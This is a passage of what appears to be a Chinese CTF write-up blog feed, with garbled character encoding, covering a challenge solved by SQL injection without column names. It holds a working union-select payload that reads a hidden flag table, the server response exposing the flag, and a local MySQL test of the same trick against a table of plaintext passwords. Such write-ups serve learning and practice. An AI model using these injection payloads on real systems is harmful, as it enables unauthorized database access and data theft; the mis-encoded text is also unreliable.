class="keyword">echo</span> <span class="string">&quot;          &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 ç»“æœ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo $result-&gt;num_rows;</span></span><br><span class="line"><span class="comment">// å…³é—­æ•°æ®åº“è¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åªè¾“å‡ºé›¶æ—¶è¡¨ä¸­çš„idå­—æ®µ,ä¸”flagæ‰€åœ¨çš„åˆ—åæœªçŸ¥</p><p>è¿™é‡Œè€ƒå¯Ÿäº†æ— åˆ—åæ³¨å…¥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=flag&#x27;/**/union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)a%23</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.20.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 18 Feb 2024 11:14:38 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.3.33</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>249</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">joeå¥½åƒå–œæ¬¢aliceï¼Œä½†æ˜¯aliceå¥½åƒä¸å–œæ¬¢joeï¼Œä½ è¦ä¸è¦æŸ¥æŸ¥ä»–ä»¬éƒ½å–œæ¬¢è°(?username=joe)æˆ–è€…(?username=alice)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="comment">&lt;!--flagåœ¨flagè¡¨é‡Œ--&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>          flag<span class="tag">&lt;<span class="name">br</span>&gt;</span>          2<span class="tag">&lt;<span class="name">br</span>&gt;</span>          SICTF</span><span class="template-variable">&#123;633db818-0209-465a-9d1c-dfbc36a469e3&#125;</span><span class="language-xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>è‡ªæµ‹ä¸€ä¸‹æ— åˆ—åæ³¨å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection <span class="built_in">id</span>:    5</span><br><span class="line">Current database: hcj_db</span><br><span class="line"></span><br><span class="line">+----+------------+----------+</span><br><span class="line">| <span class="built_in">id</span> | username   | password |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">|  1 | hcj        | 123456   |</span><br><span class="line">|  2 | nacl       | 123456   |</span><br><span class="line">| 13 | cabbage    | 12345678 |</span><br><span class="line">| 14 | qwert      | qwert    |</span><br><span class="line">| 15 | qwerty     | qwerty   |</span><br><span class="line">| 16 | cabbaget   | 12345678 |</span><br><span class="line">| 17 | cabbagety  | 12345678 |</span><br><span class="line">| 18 | asdf       | asdf     |</span><br><span class="line">| 19 | asdfg      | asdfg    |</span><br><span class="line">| 20 | www        | wwww     |</span><br><span class="line">| 21 | sss        | sss      |</span><br><span class="line">| 22 | cabbagetya | 12345678 |</span><br><span class="line">| 23 | ddd        | ddd      |</span><br><span class="line">| 24 | xxx        | xxx      |</span><br><span class="line">| 25 | fff        | fff      |</span><br><span class="line">| 26 | ffff       | fff      |</span><br><span class="line">| 27 | fffff      | fff      |</span><br><span class="line">| 28 | <span class="built_in">cat</span>        | <span class="built_in">cat</span>      |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">18 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="built_in">id</span> from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span>= 1 union <span class="keyword">select</span> `2` from (<span class="keyword">select</span> 1,2,3 union <span class="keyword">select</span> * from <span class="built_in">users</span>)a;</span><br><span class="line">+------------+</span><br><span class="line">| <span class="built_in">id</span>         |</span><br><span class="line">+------------+</span><br><span class="line">| 1          |</span><br><span class="line">| 2          |</span><br><span class="line">| hcj        |</span><br><span class="line">| nacl       |</span><br><span class="line">| cabbage    |</span><br><span class="line">| qwert      |</span><br><span class="line">| qwerty     |</span><br><span class="line">| cabbaget   |</span><br><span class="line">| cabbagety  |</span><br><span class="line">| asdf       |</span><br><span class="line">| asdfg      |</span><br><span class="line">| www        |</span><br><span class="line">| sss        |</span><br><span class="line">| cabbagetya |</span><br><span class="line">| ddd        |</span><br><span class="line">| xxx        |</span><br><span class="line">| fff        |</span><br><span class="line">| ffff       |</span><br><span class="line">| fffff      |</span><br><span class="line">| <span class="built_in">cat</span>        |</span><br><span class="line">+------------+</span><br><span class="line">20 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;100ï¼…-upload&quot;&gt;&lt;a href=&quot;#100ï¼…-upload&quot; class=&quot;headerlink&quot; title=&quot;100ï¼…_upload&quot;&gt;&lt;/a&gt;100ï¼…_upload&lt;/h2&gt;&lt;p&gt;é¦–å…ˆæ„é€ åç¼€å.php.&lt;/p&gt;
&lt;p&gt;poc:&lt;/p&gt;
&lt;figu</summary>
      
    
    
    
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="SSRF" scheme="http://example.com/tags/SSRF/"/>
    
    <category term="phpç¯å¢ƒå˜é‡æ³¨å…¥" scheme="http://example.com/tags/php%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqlæ— åˆ—åæ³¨å…¥" scheme="http://example.com/tags/sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
